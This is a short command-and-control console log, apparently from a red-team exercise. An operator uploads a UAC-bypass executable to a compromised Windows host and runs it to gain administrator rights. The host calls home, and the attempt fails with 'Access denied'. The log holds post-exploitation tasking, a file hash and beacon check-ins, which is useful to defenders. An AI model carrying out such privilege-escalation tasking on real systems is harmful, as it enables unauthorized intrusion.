01/27 10:01:53 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 2328; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:02:12 [task] 4*************进行vmi启动**********
01/27 10:02:12 [task] 获取管理员权限
01/27 10:02:12 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:02:12 [task] cd c:\RedTeam\
01/27 10:02:12 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:02:13 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:02:13 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:02:13 [task] 执行代码
01/27 10:02:46 [checkin] host called home, sent: 161042 bytes
01/27 10:02:47 [output]
received output:
ERROR:
Description = Access denied


01/27 10:02:47 [output]
received output:
ERROR:
Description = Access denied


01/27 10:02:47 [output]
received output:
ERROR:
Description = Access denied


01/27 10:05:10 [input] <neo> exit
01/27 10:05:10 [task] Tasked beacon to exit
01/27 10:05:53 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 2328; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:05:47 [checkin] host called home, sent: 8 bytes
01/27 10:05:47 [output]
beacon exit.

